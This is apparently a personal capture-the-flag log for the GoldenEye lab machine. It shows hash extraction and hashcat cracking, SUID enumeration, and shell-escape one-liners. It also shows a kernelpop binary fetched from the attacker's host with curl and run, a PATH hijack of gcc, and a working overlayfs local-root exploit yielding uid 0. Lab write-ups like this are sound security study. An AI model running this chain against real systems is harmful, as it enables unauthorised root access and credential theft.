+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+[-] Users that have previously logged onto the system:
+Username         Port     From             Latest
+root             tty1                      Thu May  3 10:08:50 -0700 2018
+boris            tty1                      Sat Apr 28 11:04:42 -0700 2018
+natalya          tty1                      Sat Apr 28 11:04:24 -0700 2018
+doak             tty1                      Sat Apr 28 11:04:31 -0700 2018
+----- snip -----
+
+
+[-] htpasswd found - could contain passwords:
+/etc/apache2/.htpasswd
+boris:$apr1$vg2drJim$wUDKP9TLw5jq4GS5jq2240
+ops:$apr1$mVvEblRU$oHDbEs4QP2YTUG25Z1PoP.
+
+┌─╼[~] 
+└────╼ hashid '$apr1$mVvEblRU$oHDbEs4QP2YTUG25Z1PoP.'
+Analyzing '$apr1$mVvEblRU$oHDbEs4QP2YTUG25Z1PoP.'
+[+] MD5(APR) 
+[+] Apache MD5 
+┌─╼[~] 
+└────╼ vim /tmp/goldneye_htpasswd.txt
+┌─╼[~] 
+└────╼ 
+
+-- HASHCAT --
+https://scottlinux.com/2017/01/31/how-to-use-hashcat-on-cpu-only/
+https://hashcat.net/wiki/doku.php?id=hashcat
+curl -sk -O http://registrationcenter-download.intel.com/akdlm/irc_nas/9019/opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgz /tmp/
+Run Installer --
+
+└────╼ hashcat -I
+hashcat (v4.2.0-3-gaf2626e6) starting...
+
+OpenCL Info:
+
+Platform ID #1
+  Vendor  : Intel(R) Corporation
+  Name    : Intel(R) OpenCL
+  Version : OpenCL 1.2 LINUX
+
+  Device ID #1
+    Type           : CPU
+    Vendor ID      : 8
+    Vendor         : Intel(R) Corporation
+    Name           : Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz
+    Version        : OpenCL 1.2 (Build 25)
+    Processor(s)   : 8
+    Clock          : 1800
+    Memory         : 8012/32050 MB allocatable
+    OpenCL Version : OpenCL C 1.2 
+    Driver Version : 1.2.0.25
+
+Platform ID #2
+  Vendor  : The pocl project
+  Name    : Portable Computing Language
+  Version : OpenCL 1.2 pocl 1.1 None+Asserts, LLVM 6.0.1, SPIR, SLEEF, DISTRO, POCL_DEBUG
+
+  Device ID #2
+    Type           : CPU
+    Vendor ID      : 128
+    Vendor         : GenuineIntel
+    Name           : pthread-Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz
+    Version        : OpenCL 1.2 pocl HSTR: pthread-x86_64-pc-linux-gnu-skylake
+    Processor(s)   : 8
+    Clock          : 4000
+    Memory         : 8192/30002 MB allocatable
+    OpenCL Version : OpenCL C 1.2 pocl
+    Driver Version : 1.1
+
+┌─╼[/usr/src/linux-headers-4.17.0-kali1-amd64/include/config] 
+└────╼ 
+
+Test hashcat --
+Noice !! --
+
+└╼  hashcat -a 3 -m 1600 -d 1 -w 2 /tmp/goldeneye_htpasswd.txt '?a?a?a?a?a?a' --force -O
+hashcat (v4.2.0-3-gaf2626e6) starting...
+
+OpenCL Platform #1: Intel(R) Corporation
+========================================
+* Device #1: Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz, 8012/32050 MB allocatable, 8MCU
+
+OpenCL Platform #2: The pocl project
+====================================
+* Device #2: pthread-Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz, skipped.
+
+Hashes: 2 digests; 2 unique digests, 2 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+
+Applicable optimizers:
+* Optimized-Kernel
+* Zero-Byte
+* Brute-Force
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 15
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+INFO: Removed 1 hash found in potfile.
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s
+
+Session..........: hashcat
+Status...........: Running
+Hash.Type........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
+Hash.Target......: /tmp/goldeneye_htpasswd.txt
+Time.Started.....: Thu Aug  9 22:38:03 2018 (13 secs)
+Time.Estimated...: Tue Jul  2 11:36:58 2019 (326 days, 12 hours)
+Guess.Mask.......: ?a?a?a?a?a?a [6]
+Guess.Queue......: 1/1 (100.00%)
+Speed.Dev.#1.....:    26055 H/s (9.46ms) @ Accel:256 Loops:125 Thr:1 Vec:8
+Recovered........: 1/2 (50.00%) Digests, 1/2 (50.00%) Salts
+Progress.........: 727040/1470183781250 (0.00%)
+Rejected.........: 0/727040 (0.00%)
+Restore.Point....: 2048/7737809375 (0.00%)
+Candidates.#1....: _D0123 -> _8SSTA
+HWMon.Dev.#1.....: N/A
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => 
+
+[-] Location and contents (if accessible) of .bash_history file(s):
+/home/boris/.bash_history
+sudo -i
+shutdown
+exit
+vim /etc/issue
+sudo -i
+exit
+sudo -i
+exit
+
+www-data@ubuntu:/tmp$ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null
+<0 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null                      
+-rwsr-xr-x 1 root root 69120 Jun  3  2014 /bin/umount
+-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 36936 Feb 16  2014 /bin/su
+-rwsr-xr-x 1 root root 94792 Jun  3  2014 /bin/mount
+-rwsr-xr-x 1 root root 30800 Dec 16  2013 /bin/fusermount
+-rwsr-xr-x 1 root root 46424 Feb 16  2014 /usr/bin/chfn
+-rwsr-xr-x 1 root root 155008 Feb 10  2014 /usr/bin/sudo
+-rwsr-xr-x 1 root root 41336 Feb 16  2014 /usr/bin/chsh
+-rwsr-xr-x 1 root root 68152 Feb 16  2014 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 32464 Feb 16  2014 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 75256 Oct 21  2013 /usr/bin/mtr
+-rwsr-xr-x 1 root root 47032 Feb 16  2014 /usr/bin/passwd
+-rwsr-xr-x 1 root root 23104 May  7  2014 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-- 1 root messagebus 310800 Jul  3  2014 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 10344 Apr 12  2014 /usr/lib/pt_chown
+-rwsr-xr-- 1 root dip 343168 Jan 22  2013 /usr/sbin/pppd
+www-data@ubuntu:/tmp$ cat lpc.txt | grep libc-bin
+cat lpc.txt | grep libc-bin
+    libc-bin 2.19-0ubuntu6  Embedded GNU C Library: Binaries
+www-data@ubuntu:/tmp$ 
+
+└────╼ searchsploit pt_chown
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+ Exploit Title                                                                                                                                        |  Path
+                                                                                                                                                      | (/usr/share/exploitdb/)
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+GNU glibc 2.1/2.1.1 -6 - 'pt_chown' Local Privilege Escalation                                                                                        | exploits/linux/local/19467.c
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+┌─╼[~] 
+└────╼ 
+
+Boo ---
+Anyway -- FLAG 1 !! --
+└────╼ curl -sk --user 'admin:xWinter1995x!' 'http://goldeneye.local/006-final/xvf7-flag/' | html2text 
+
+****** Flag Captured ******
+Congrats! *******************************
+You've captured the codes! And stopped Alec Trevelyan from his indestructible
+vengeance!!!!
+****************************************
+┌─╼[/tmp] 
+└────╼ 
+
+Saved the cool Screen shot --
+file:///home/cdowns/Pictures/GoldenEye_Flag1.png
+
+PRIV ESC --
+CHECKING KERNEL CRAP --
+
+cdowns@7242-alpha-reticuli:~|⇒  cd Github/kernelpop 
+cdowns@7242-alpha-reticuli:~/Github/kernelpop|master⚡ 
+⇒  git fetch ; git pull
+remote: Counting objects: 7, done.
+remote: Compressing objects: 100% (3/3), done.
+remote: Total 7 (delta 4), reused 7 (delta 4), pack-reused 0
+Unpacking objects: 100% (7/7), done.
+From https://github.com/spencerdodd/kernelpop
+   772f399..b3467d3  master     -> origin/master
+Updating 772f399..b3467d3
+Fast-forward
+ all_exploits.py                |   2 +
+ exploits/linux/CVE201716996.py | 524 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+ 2 files changed, 526 insertions(+)
+ create mode 100644 exploits/linux/CVE201716996.py
+cdowns@7242-alpha-reticuli:~/Github/kernelpop|master⚡ 
+⇒  go build
+can't load package: package .: no Go files in /home/cdowns/Github/kernelpop
+cdowns@7242-alpha-reticuli:~/Github/kernelpop|master⚡ 
+⇒  ls
+README.md  create_executable.sh*  constants.py  img/  exploits/  src/  playground/  kernelpop.py  to_add.txt  test/  kernelpop*  build/  kernelpop.spec  dist/  all_exploits.py
+cdowns@7242-alpha-reticuli:~/Github/kernelpop|master⚡ 
+⇒  ./create_executable.sh 
+[*] creating an executable of the project
+[*] identifying build environment
+	[+] running on linux
+[*] installing pip
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+python-pip is already the newest version (9.0.1-2.3).
+0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
+[*] installing pyinstaller
+Requirement already satisfied: pyinstaller in /home/cdowns/.local/lib/python2.7/site-packages (3.3.1)
+Requirement already satisfied: pefile>=2017.8.1 in /home/cdowns/.local/lib/python2.7/site-packages (from pyinstaller) (2017.11.5)
+Requirement already satisfied: dis3 in /home/cdowns/.local/lib/python2.7/site-packages (from pyinstaller) (0.1.2)
+Requirement already satisfied: macholib>=1.8 in /home/cdowns/.local/lib/python2.7/site-packages (from pyinstaller) (1.9)
+Requirement already satisfied: setuptools in /home/cdowns/.local/lib/python2.7/site-packages (from pyinstaller) (39.2.0)
+Requirement already satisfied: future in /home/cdowns/.local/lib/python2.7/site-packages (from pefile>=2017.8.1->pyinstaller) (0.16.0)
+Requirement already satisfied: altgraph>=0.15 in /home/cdowns/.local/lib/python2.7/site-packages (from macholib>=1.8->pyinstaller) (0.15)
+[*] building the executable
+181 INFO: PyInstaller: 3.3.1
+181 INFO: Python: 2.7.15
+181 INFO: Platform: Linux-4.17.0-kali1-amd64-x86_64-with-Kali-kali-rolling-kali-rolling
+182 INFO: wrote /usr/local/secure/Github/kernelpop/kernelpop.spec
+187 INFO: UPX is available.
+188 INFO: Extending PYTHONPATH with paths
+['/usr/local/secure/Github/kernelpop', '/usr/local/secure/Github/kernelpop']
+188 INFO: checking Analysis
+191 INFO: Building because _python_version changed
+191 INFO: Initializing module dependency graph...
+192 INFO: Initializing module graph hooks...
+263 INFO: running Analysis out00-Analysis.toc
+278 INFO: Caching module hooks...
+281 INFO: Analyzing /usr/local/secure/Github/kernelpop/kernelpop.py
+1514 INFO: Processing pre-safe import module hook   _xmlplus
+2317 INFO: Processing pre-find module path hook   distutils
+2570 INFO: Loading module hooks...
+2570 INFO: Loading module hook "hook-distutils.py"...
+2572 INFO: Loading module hook "hook-xml.py"...
+2650 INFO: Loading module hook "hook-httplib.py"...
+2650 INFO: Loading module hook "hook-pydoc.py"...
+2651 INFO: Excluding import 'Tkinter'
+2651 INFO:   Removing import of Tkinter from module pydoc
+2651 INFO: Loading module hook "hook-_tkinter.py"...
+2728 INFO: checking Tree
+2741 INFO: checking Tree
+2745 INFO: Loading module hook "hook-encodings.py"...
+3118 INFO: Looking for ctypes DLLs
+3181 INFO: Analyzing run-time hooks ...
+3186 INFO: Looking for dynamic libraries
+3404 INFO: Looking for eggs
+3404 INFO: Python library not in binary dependencies. Doing additional searching...
+3428 INFO: Using Python library /usr/lib/x86_64-linux-gnu/libpython2.7.so.1.0
+3431 INFO: Warnings written to /usr/local/secure/Github/kernelpop/build/kernelpop/warnkernelpop.txt
+3450 INFO: Graph cross-reference written to /usr/local/secure/Github/kernelpop/build/kernelpop/xref-kernelpop.html
+3487 INFO: checking PYZ
+3490 INFO: Building because toc changed
+3490 INFO: Building PYZ (ZlibArchive) /usr/local/secure/Github/kernelpop/build/kernelpop/out00-PYZ.pyz
+3697 INFO: Building PYZ (ZlibArchive) /usr/local/secure/Github/kernelpop/build/kernelpop/out00-PYZ.pyz completed successfully.
+3722 INFO: checking PKG
+3723 INFO: Building because toc changed
+3723 INFO: Building PKG (CArchive) out00-PKG.pkg
+5371 INFO: Building PKG (CArchive) out00-PKG.pkg completed successfully.
+5376 INFO: Bootloader /home/cdowns/.local/lib/python2.7/site-packages/PyInstaller/bootloader/Linux-64bit/run
+5377 INFO: checking EXE
+5385 INFO: Building because toc changed
+5385 INFO: Building EXE from out00-EXE.toc
+5386 INFO: Appending archive to ELF section in EXE /usr/local/secure/Github/kernelpop/dist/kernelpop
+5396 INFO: Building EXE from out00-EXE.toc completed successfully.
+[*] copying executable to project root
+[*] cleaning up build
+[+] executable at /home/cdowns/Github/kernelpop/kernelpop
+[+] complete
+cdowns@7242-alpha-reticuli:~/Github/kernelpop|master⚡ 
+⇒  sudo cp -Rvp /home/cdowns/Github/kernelpop/kernelpop /var/www/html/ ; sudo chown -R www-data:www-data kernelpop
+'/home/cdowns/Github/kernelpop/kernelpop' -> '/var/www/html/kernelpop'
+cdowns@7242-alpha-reticuli:~/Github/kernelpop|master⚡ 
+⇒  
+
+
+www-data@ubuntu:/tmp$ curl -sk -O https://192.168.0.2:/kernelpop
+curl -sk -O https://192.168.0.2:/kernelpop
+www-data@ubuntu:/tmp$ chmod 755 kernelpop
+chmod 755 kernelpop
+www-data@ubuntu:/tmp$ ./kernelpop
+./kernelpop
+
+##########################
+#  welcome to kernelpop  #
+#                        #
+# let's pop some kernels #
+##########################
+
+[*] grabbing distro version and release from underlying OS (linuxubuntu14)
+[*] grabbing kernel version from 'uname -a'
+[!] could only get the kernel base...may not have accurate matches
+[+] kernel (Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux) identified as:
+[base]
+	type:			linux
+	distro:			linuxubuntu14
+	version:		3.13.0-32
+	architecture:		x86_64
+[!] no specific distro kernel discovered...likelihood of false positives is high
+[*] matching kernel to known exploits
+[+] discovered 13 possible exploits !
+	[[ distro kernel version vulnerable ]]
+		CVE20144699	Exploitable race condition in linux before 3.15.4
+	[[ base linux kernel vulnerable ]]
+		CVE20177308	`packet_set_ring` in net/packet/af_packet.c can gain privileges via crafted system calls.
+		CVE20140196	`n_tty_write` vuln before 3.14.4 allows priv esc to root
+		CVE20143153	`futex_requeue` vulnerability before 3.14.6 allows for priv esc
+		CVE20144014	`chmod` restriction bypass allows users to get root before 3.14.8
+		CVE20151328_64	overlayfs implementation in linux kernel does not properly check file-create permissions
+		CVE20160728	`join_session_keyring` function can be abused to get root NOTE: (takes about 30 minutes)
+		CVE20162384	Double free vulnerability in the `snd_usbmidi_create` (requires physical proximity)
+		CVE20165195_64	Dirty COW race condition root priv esc for 64 bit
+		CVE20165195_64_poke	Dirty COW race condition root priv esc for 64 bit (poke variant)
+		CVE20173630	Stack clash vuln in solaris
+		CVE20176074	`dccp_rcv_state_process` in net/dccp/input.c mishandles structs and can lead to local root
+		CVE20171000112	ip_ufo_append_data() memory corruption flaw can be exploited to gain root privileges.
+www-data@ubuntu:/tmp$ 
+
+
+Let's check it out --
+		CVE20151328_64	overlayfs implementation in linux kernel does not properly check file-create permissions
+
+
+cdowns@7242-alpha-reticuli:~/Github/kernelpop|master⚡ 
+⇒  fd . | ag CVE20151328_64
+exploits/linux/CVE20151328_64.py
+cdowns@7242-alpha-reticuli:~/Github/kernelpop|master⚡ 
+⇒  
+
+[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...
+
+[+] Installed Tools
+    /usr/bin/awk
+    /usr/bin/perl
+    /usr/bin/python
+    /usr/bin/cc
+    /usr/bin/vi
+    /usr/bin/vim
+    /usr/bin/find
+    /bin/netcat
+    /bin/nc
+    /usr/bin/wget
+    /usr/bin/ftp
+
+[+] Related Shell Escape Sequences...
+
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    awk-->	awk 'BEGIN {system("/bin/bash")}'
+    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+    perl-->	perl -e 'exec "/bin/bash";'
+
+???? Ok --
+Let's be a shady prick and modify our $PATH and symlink gcc -> clang. 
+Yeah ? Sounds good --
+
+www-data@ubuntu:/tmp$ which gcc ; which clang
+which gcc ; which clang
+/usr/bin/clang
+www-data@ubuntu:/tmp$ echo $PATH
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+www-data@ubuntu:/tmp$ export PATH=/tmp:$PATH ; ln -sf /usr/bin/clang gcc
+export PATH=/tmp:$PATH ; ln -sf /usr/bin/clang gcc
+www-data@ubuntu:/tmp$ kernelpop -e CVE20151328_64
+kernelpop -e CVE20151328_64
+
+##########################
+#  welcome to kernelpop  #
+#                        #
+# let's pop some kernels #
+##########################
+
+[*] attempting to perform exploitation with exploit CVE20151328_64
+Would you like to run exploit CVE20151328_64 on this system? (y/n): y
+y
+	[*] writing the exploit source to disk (/tmp/CVE20151328_64.c)
+	[*] compiling exploit CVE20151328_64 to /tmp/CVE20151328_64
+	[*] gcc -o /tmp/CVE20151328_64 /tmp/CVE20151328_64.c
+	[+] compilation successful!
+	[*] performing exploitation of CVE20151328_64
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# cat .flag.txt
+cat .flag.txt
+Alec told me to place the codes here: 
+
+568628e0d993b1973adc718237da6e93
+
+If you captured this make sure to go here.....
+/006-final/xvf7-flag/
+
+----- DONE -----
+
+__EOF__
+
+
+
+
+
+
+
